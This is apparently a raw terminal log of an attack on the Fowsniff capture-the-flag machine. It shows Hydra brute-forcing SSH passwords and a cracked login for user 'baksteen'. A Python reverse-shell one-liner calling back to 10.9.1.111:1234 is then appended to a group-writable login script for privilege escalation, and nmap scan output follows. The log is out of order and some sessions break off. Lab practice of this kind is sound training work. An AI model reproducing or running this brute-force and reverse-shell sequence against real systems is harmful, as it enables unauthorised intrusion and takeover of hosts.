+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "scoobydoo2" - 15 of 90 [child 14] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "Not found." - 16 of 90 [child 15] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "carp4ever" - 17 of 91 [child 0] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "orlando12" - 18 of 91 [child 3] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "07011972" - 19 of 91 [child 5] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "S1ck3nBluff+secureshell" - 20 of 91 [child 10] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "mailcall" - 21 of 91 [child 1] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "bilbo101" - 22 of 91 [child 2] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "apples01" - 23 of 91 [child 4] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "skyler22" - 24 of 91 [child 6] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "scoobydoo2" - 25 of 91 [child 7] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "Not found." - 26 of 91 [child 8] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "carp4ever" - 27 of 91 [child 9] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "orlando12" - 28 of 91 [child 11] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "07011972" - 29 of 91 [child 12] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "S1ck3nBluff+secureshell" - 30 of 91 [child 14] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "mailcall" - 31 of 91 [child 15] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "bilbo101" - 32 of 91 [child 10] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "apples01" - 33 of 91 [child 3] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "skyler22" - 34 of 91 [child 12] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "scoobydoo2" - 35 of 91 [child 0] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "Not found." - 36 of 91 [child 1] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "carp4ever" - 37 of 91 [child 2] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "orlando12" - 38 of 91 [child 4] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "07011972" - 39 of 91 [child 5] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "S1ck3nBluff+secureshell" - 40 of 91 [child 6] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "mailcall" - 41 of 91 [child 7] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "bilbo101" - 42 of 91 [child 8] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "apples01" - 43 of 91 [child 9] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "skyler22" - 44 of 91 [child 11] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "scoobydoo2" - 45 of 91 [child 14] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "Not found." - 46 of 91 [child 15] (0/1)
+[RE-ATTEMPT] target 10.10.109.224 - login "seina" - pass "Not found." - 46 of 91 [child 1] (0/1)
+[RE-ATTEMPT] target 10.10.109.224 - login "seina" - pass "07011972" - 46 of 91 [child 5] (0/1)
+[RE-ATTEMPT] target 10.10.109.224 - login "seina" - pass "apples01" - 46 of 91 [child 9] (0/1)
+[22][ssh] host: 10.10.109.224   login: baksteen   password: S1ck3nBluff+secureshell
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "carp4ever" - 47 of 91 [child 6] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "orlando12" - 48 of 91 [child 10] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "07011972" - 49 of 91 [child 0] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "S1ck3nBluff+secureshell" - 50 of 91 [child 12] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "mailcall" - 51 of 91 [child 15] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "bilbo101" - 52 of 91 [child 2] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "apples01" - 53 of 91 [child 3] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "skyler22" - 54 of 91 [child 4] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "scoobydoo2" - 55 of 91 [child 7] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "Not found." - 56 of 91 [child 8] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "carp4ever" - 57 of 91 [child 11] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "orlando12" - 58 of 91 [child 14] (0/1)
+[RE-ATTEMPT] target 10.10.109.224 - login "stone" - pass "apples01" - 58 of 91 [child 3] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "07011972" - 59 of 91 [child 5] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "S1ck3nBluff+secureshell" - 60 of 91 [child 1] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "mursten" - pass "mailcall" - 61 of 91 [child 9] (0/1)
+[RE-ATTEMPT] target 10.10.109.224 - login "mursten" - pass "07011972" - 61 of 91 [child 5] (0/1)
+[RE-ATTEMPT] target 10.10.109.224 - login "mursten" - pass "S1ck3nBluff+secureshell" - 61 of 91 [child 1] (0/1)
+[ATTEMPT] target 10.10.109.224 - login "mursten" - pass "bilbo101" - 62 of 91 [child 6] (0/1)
+[RE-ATTEMPT] target 10.10.109.224 - login "mursten" - pass "07011972" - 62 of 91 [child 5] (0/1)
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+                                                                                                                                                 
+┌──(zetayota㉿Sophy)-[~/fowsniff_all]
+└─$ ssh baksteen@10.10.109.224
+The authenticity of host '10.10.109.224 (10.10.109.224)' can't be established.
+ED25519 key fingerprint is SHA256:KZLP3ydGPtqtxnZ11SUpIwqMdeOUzGWHV+c3FqcKYg0.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:2: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.109.224' (ED25519) to the list of known hosts.
+baksteen@10.10.109.224's password: 
+
+                            _____                       _  __  __  
+      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
+   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
+.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
+-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
+-:      y.      dssssssso                ____                      
+-:      y.      dssssssso               / ___|___  _ __ _ __        
+-:      y.      dssssssso              | |   / _ \| '__| '_ \     
+-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
+-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
+-:    .+mdddddddmyyyyyhy:                              |_|        
+-: -odMMMMMMMMMMmhhdy/.    
+.ohdddddddddddddho:                  Delivering Solutions
+
+
+   ****  Welcome to the Fowsniff Corporate Server! **** 
+
+              ---------- NOTICE: ----------
+
+ * Due to the recent security breach, we are running on a very minimal system.
+ * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.
+
+
+Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
+baksteen@fowsniff:~$ ls
+Maildir  term.txt
+baksteen@fowsniff:~$ cat term.txt 
+I wonder if the person who coined the term "One Hit Wonder" 
+came up with another other phrases.
+baksteen@fowsniff:~$ whoami
+baksteen
+baksteen@fowsniff:~$ groups baksteen
+baksteen : users baksteen
+baksteen@fowsniff:~$ find ~ -type f -name "cube.sh"
+baksteen@fowsniff:~$ find ~ -type f -name "cube.sh"
+baksteen@fowsniff:~$ 
+baksteen@fowsniff:~$ find / -type f -name "cube.sh" 2>/dev/null
+/opt/cube/cube.sh
+baksteen@fowsniff:~$ cat /opt/cube/cube.sh
+printf "
+                            _____                       _  __  __  
+      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
+   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
+.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
+-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
+-:      y.      dssssssso                ____                      
+-:      y.      dssssssso               / ___|___  _ __ _ __        
+-:      y.      dssssssso              | |   / _ \| '__| '_ \     
+-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
+-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
+-:    .+mdddddddmyyyyyhy:                              |_|        
+-: -odMMMMMMMMMMmhhdy/.    
+.ohdddddddddddddho:                  Delivering Solutions\n\n"
+
+baksteen@fowsniff:~$ ls -la /opt/cube/cube.sh
+-rw-rwxr-- 1 parede users 851 Mar 11  2018 /opt/cube/cube.sh
+baksteen@fowsniff:~$ python --version
+The program 'python' can be found in the following packages:
+ * python-minimal
+ * python3
+Ask your administrator to install one of them
+baksteen@fowsniff:~$ nano /opt/cube/cube.sh
+baksteen@fowsniff:~$ cat /opt/cube/cube.sh
+printf "
+                            _____                       _  __  __  
+      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
+   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
+.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
+-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
+-:      y.      dssssssso                ____                      
+-:      y.      dssssssso               / ___|___  _ __ _ __        
+-:      y.      dssssssso              | |   / _ \| '__| '_ \     
+-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
+-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
+-:    .+mdddddddmyyyyyhy:                              |_|        
+-: -odMMMMMMMMMMmhhdy/.    
+.ohdddddddddddddho:                  Delivering Solutions\n\n"
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((10.9.1.111,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+baksteen@fowsniff:~$ logout
+Connection to 10.10.109.224 closed.
+                                                                                                                                                 
+┌──(zetayota㉿Sophy)-[~/fowsniff_all]
+└─$ ssh baksteen@10.10.109.224
+baksteen@10.10.109.224's password: 
+
+                            _____                       _  __  __  
+      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
+   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
+.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
+-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
+-:      y.      dssssssso                ____                      
+-:      y.      dssssssso               / ___|___  _ __ _ __        
+-:      y.      dssssssso              | |   / _ \| '__| '_ \     
+-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
+-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
+-:    .+mdddddddmyyyyyhy:                              |_|        
+-: -odMMMMMMMMMMmhhdy/.    
+.ohdddddddddddddho:                  Delivering Solutions
+
+
+   ****  Welcome to the Fowsniff Corporate Server! **** 
+
+              ---------- NOTICE: ----------
+
+ * Due to the recent security breach, we are running on a very minimal system.
+ * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.
+
+
+Last login: Fri Mar 28 10:35:20 2025 from 10.9.1.111
+baksteen@fowsniff:~$ exit
+logout
+Connection to 10.10.109.224 closed.
+                                                                                                                                                 
+┌──(zetayota㉿Sophy)-[~/fowsniff_all]
+└─$ ssh baksteen@10.10.109.224
+baksteen@10.10.109.224's password: 
+
+                            _____                       _  __  __  
+      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
+   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
+.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
+-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
+-:      y.      dssssssso                ____                      
+-:      y.      dssssssso               / ___|___  _ __ _ __        
+-:      y.      dssssssso              | |   / _ \| '__| '_ \     
+-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
+-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
+-:    .+mdddddddmyyyyyhy:                              |_|        
+-: -odMMMMMMMMMMmhhdy/.    
+.ohdddddddddddddho:                  Delivering Solutions
+
+
+   ****  Welcome to the Fowsniff Corporate Server! **** 
+
+              ---------- NOTICE: ----------
+
+ * Due to the recent security breach, we are running on a very minimal system.
+ * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.
+
+
+Last login: Fri Mar 28 11:00:35 2025 from 10.9.1.111
+baksteen@fowsniff:~$ nano /opt/cube/cube.sh
+baksteen@fowsniff:~$ nano /opt/cube/cube.sh
+baksteen@fowsniff:~$ exit
+logout
+Connection to 10.10.109.224 closed.
+                                                                                                                                                 
+┌──(zetayota㉿Sophy)-[~/fowsniff_all]
+└─$ ssh baksteen@10.10.109.224
+baksteen@10.10.109.224's password: 
+
+
+
+
+
+
+
+
+NMAP AND ROBOTS TXT FILE
+
+┌──(zetayota㉿Sophy)-[~]
+└─$ nmap -A -sV -T4 10.10.109.224 > nmap_scanresult.txt
+                                                             
+┌──(zetayota㉿Sophy)-[~]
+└─$ cat nmap_scanresult.txt 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-28 09:32 EDT
+Nmap scan report for 10.10.109.224
+Host is up (0.24s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
+|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
+|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
+80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Fowsniff Corp - Delivering Solutions
+110/tcp open  pop3    Dovecot pop3d
+|_pop3-capabilities: SASL(PLAIN) UIDL RESP-CODES AUTH-RESP-CODE PIPELINING TOP USER CAPA
+143/tcp open  imap    Dovecot imapd
+|_imap-capabilities: capabilities more SASL-IR IDLE OK listed Pre-login post-login IMAP4rev1 LITERAL+ ENABLE ID AUTH=PLAINA0001 LOGIN-REFERRALS have
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=3/28%OT=22%CT=1%CU=42039%PV=Y%DS=2%DC=T%G=Y%TM=67E6A50
+OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=104%TI=Z%CI=I%TS=8)SEQ(SP=1
+OS:04%GCD=1%ISR=109%TI=Z%CI=I%TS=8)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=I%TS=8)
+OS:SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=I%TS=8)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI
+OS:=I%TS=8)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6
+OS:%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%
+OS:W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S
+OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%R
+OS:D=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=
+OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U
+OS:1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   248.95 ms 10.9.0.1
+2   250.31 ms 10.10.109.224
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 39.29 seconds
+                                                             
+┌──(zetayota㉿Sophy)-[~]
+└─$ wget 10.10.109.224:80/robot.txt                                                                         
+Prepended http:// to '10.10.109.224:80/robot.txt'
+--2025-03-28 09:42:15--  http://10.10.109.224/robot.txt
+Connecting to 10.10.109.224:80... connected.
+HTTP request sent, awaiting response... 404 Not Found
+2025-03-28 09:42:15 ERROR 404: Not Found.
+
+                                                                                                                                                             
+┌──(zetayota㉿Sophy)-[~]
+└─$ wget 10.10.109.224:80/robots.txt 
+Prepended http:// to '10.10.109.224:80/robots.txt'
+--2025-03-28 09:42:31--  http://10.10.109.224/robots.txt
+Connecting to 10.10.109.224:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 26 [text/plain]
+Saving to: ‘robots.txt’
+
+robots.txt                              100%[============================================================================>]      26  --.-KB/s    in 0s      
+
+2025-03-28 09:42:31 (806 KB/s) - ‘robots.txt’ saved [26/26]
+
+                                                                                                                                                             
+┌──(zetayota㉿Sophy)-[~]
+└─$ ls
+ addobbe.apk                capture-02.csv             Downloads               kipoffcapture-01.csv             pass.txt             Templates
+ capture-01.cap             capture-02.kismet.csv      hashes.txt              kipoffcapture-01.kismet.csv      Pictures             TheFatRat
+ capture-01.csv             capture-02.kismet.netxml   hashing.txt             kipoffcapture-01.kismet.netxml   Public               users.txt
+ capture-01.kismet.csv      capture-02.log.csv        'history mr robot box'   kipoffcapture-01.log.csv         Ratinthehood.apk     Videos
+ capture-01.kismet.netxml   Desktop                    hs                      kipoffnewcap.hccap               robots.txt           waydroid-installer
+ capture-01.log.csv         Documents                  hydra.restore           Music                            Samsungmini.apk
+ capture-02.cap             dos.sh                     kipoffcapture-01.cap    nmap_scanresult.txt              sha256_hashing.txt
+                                                                                                                                                             
+┌──(zetayota㉿Sophy)-[~]
+└─$ cat robots.txt 
+User-agent: *
+Disallow: /
+                                                                                                                                                             
+┌──(zetayota㉿Sophy)-[~]
+└─$ 
+
+
+
+SETTING UP OPENVPN: INITIALIZATION SEQUENCE COMPLETED
+
+┌──(zetayota㉿Sophy)-[~/Downloads]
+└─$ sudo openvpn geburtstag.ovpn
+[sudo] password for zetayota: 
+2025-03-28 09:23:08 Note: --cipher is not set. OpenVPN versions before 2.5 defaulted to BF-CBC as fallback when cipher negotiation failed in this case. If you need this fallback please add '--data-ciphers-fallback BF-CBC' to your configuration and/or add BF-CBC to --data-ciphers.
+2025-03-28 09:23:08 Note: cipher 'AES-256-CBC' in --data-ciphers is not supported by ovpn-dco, disabling data channel offload.
+2025-03-28 09:23:08 OpenVPN 2.6.13 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] [DCO]
+2025-03-28 09:23:08 library versions: OpenSSL 3.4.1 11 Feb 2025, LZO 2.10
+2025-03-28 09:23:08 DCO version: N/A
+2025-03-28 09:23:08 TCP/UDP: Preserving recently used remote address: [AF_INET]54.76.30.11:1194
+2025-03-28 09:23:08 Socket Buffers: R=[212992->425984] S=[212992->425984]
+2025-03-28 09:23:08 UDPv4 link local: (not bound)
+2025-03-28 09:23:08 UDPv4 link remote: [AF_INET]54.76.30.11:1194
+2025-03-28 09:23:09 TLS: Initial packet from [AF_INET]54.76.30.11:1194, sid=6b34c2fa 844cb274
+2025-03-28 09:23:09 VERIFY OK: depth=1, CN=ChangeMe
+2025-03-28 09:23:09 VERIFY KU OK
+2025-03-28 09:23:09 Validating certificate extended key usage
+2025-03-28 09:23:09 ++ Certificate has EKU (str) TLS Web Server Authentication, expects TLS Web Server Authentication
+2025-03-28 09:23:09 VERIFY EKU OK
+2025-03-28 09:23:09 VERIFY OK: depth=0, CN=server
+2025-03-28 09:23:09 Control Channel: TLSv1.3, cipher TLSv1.3 TLS_AES_256_GCM_SHA384, peer certificate: 2048 bits RSA, signature: RSA-SHA256, peer temporary key: 253 bits X25519
+2025-03-28 09:23:09 [server] Peer Connection Initiated with [AF_INET]54.76.30.11:1194
+2025-03-28 09:23:09 TLS: move_session: dest=TM_ACTIVE src=TM_INITIAL reinit_src=1
+2025-03-28 09:23:09 TLS: tls_multi_process: initial untrusted session promoted to trusted
+2025-03-28 09:23:10 SENT CONTROL [server]: 'PUSH_REQUEST' (status=1)
+2025-03-28 09:23:11 PUSH: Received control message: 'PUSH_REPLY,route 10.10.0.0 255.255.0.0,route 10.101.0.0 255.255.0.0,route 10.103.0.0 255.255.0.0,route-metric 1000,comp-lzo no,route-gateway 10.9.0.1,topology subnet,ping 5,ping-restart 120,ifconfig 10.9.1.111 255.255.0.0,peer-id 232'
+2025-03-28 09:23:11 OPTIONS IMPORT: --ifconfig/up options modified
+2025-03-28 09:23:11 OPTIONS IMPORT: route options modified
+2025-03-28 09:23:11 OPTIONS IMPORT: route-related options modified
+2025-03-28 09:23:11 Using peer cipher 'AES-256-CBC'
+2025-03-28 09:23:11 net_route_v4_best_gw query: dst 0.0.0.0
+2025-03-28 09:23:11 net_route_v4_best_gw result: via 192.168.0.1 dev wlan0
+2025-03-28 09:23:11 ROUTE_GATEWAY 192.168.0.1/255.255.255.0 IFACE=wlan0 HWADDR=a8:6d:aa:c6:50:a2
+2025-03-28 09:23:11 TUN/TAP device tun0 opened
+2025-03-28 09:23:11 net_iface_mtu_set: mtu 1500 for tun0
+2025-03-28 09:23:11 net_iface_up: set tun0 up
+2025-03-28 09:23:11 net_addr_v4_add: 10.9.1.111/16 dev tun0
+2025-03-28 09:23:11 net_route_v4_add: 10.10.0.0/16 via 10.9.0.1 dev [NULL] table 0 metric 1000
+2025-03-28 09:23:11 net_route_v4_add: 10.101.0.0/16 via 10.9.0.1 dev [NULL] table 0 metric 1000
+2025-03-28 09:23:11 net_route_v4_add: 10.103.0.0/16 via 10.9.0.1 dev [NULL] table 0 metric 1000
+2025-03-28 09:23:11 Initialization Sequence Completed
+2025-03-28 09:23:11 Data Channel: cipher 'AES-256-CBC', auth 'SHA512', peer-id: 232, compression: 'stub'
+2025-03-28 09:23:11 Timers: ping 5, ping-restart 120
+2025-03-28 09:23:11 Protocol options: explicit-exit-notify 3
+
+
+
+
